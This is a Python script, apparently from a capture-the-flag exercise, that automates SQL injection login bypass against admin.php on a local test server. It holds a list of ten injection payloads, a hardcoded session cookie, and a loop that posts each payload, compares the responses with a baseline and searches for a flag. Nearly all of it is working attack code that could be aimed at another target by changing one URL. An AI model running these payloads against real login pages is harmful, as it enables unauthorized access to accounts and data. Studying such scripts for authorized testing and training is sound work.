import requests
import re

# Target configuration
target_url = "http://127.0.0.1:32816/admin.php"
session_cookie = {"PHPSESSID": "40bd21fd631cfebd5f684d8a97f3d915"}

# SQL injection payloads
payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "admin' #",
    "' OR 1=1--",
    "admin' OR 1=1--",
    "' OR '1'='1'--",
    "admin' OR '1'='1'--",
    "') OR ('1'='1",
    "admin') OR ('1'='1')--",
    "' OR 'a'='a"
]

print("[*] SQL Injection Testing on admin.php")
print(f"[*] Target: {target_url}\n")

# Baseline
baseline_data = {"username": "normaluser", "password": "wrongpassword"}
baseline = requests.post(target_url, data=baseline_data, cookies=session_cookie, allow_redirects=False)
print(f"[*] Baseline: Status={baseline.status_code} Length={len(baseline.content)}B Location={baseline.headers.get('Location', 'None')}\n")

# Test payloads
interesting = []
for i, payload in enumerate(payloads, 1):
    data = {"username": payload, "password": "password"}
    resp = requests.post(target_url, data=data, cookies=session_cookie, allow_redirects=False)
    
    # Check for differences
    status_diff = resp.status_code != baseline.status_code
    length_diff = abs(len(resp.content) - len(baseline.content)) > 50
    location_diff = resp.headers.get('Location') != baseline.headers.get('Location')
    
    # Check for success/flag patterns
    has_flag = 'FLAG{' in resp.text
    has_success = any(word in resp.text.lower() for word in ['welcome', 'dashboard', 'logged', 'logout', 'admin panel'])
    
    is_interesting = status_diff or length_diff or location_diff or has_flag or has_success
    
    print(f"[{i}] {payload}")
    print(f"    Status={resp.status_code} Length={len(resp.content)}B Location={resp.headers.get('Location', 'None')}")
    
    if is_interesting:
        print(f"    [!] INTERESTING")
        interesting.append((payload, resp))
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"    [!!!] FLAG: {flag_match.group(0)}")

print(f"\n[*] Found {len(interesting)} interesting responses")

# Show full response for interesting payloads
for payload, resp in interesting:
    print(f"\n{'='*60}")
    print(f"Payload: {payload}")
    print(f"Status: {resp.status_code} | Location: {resp.headers.get('Location')}")
    print(f"Response:\n{resp.text}")

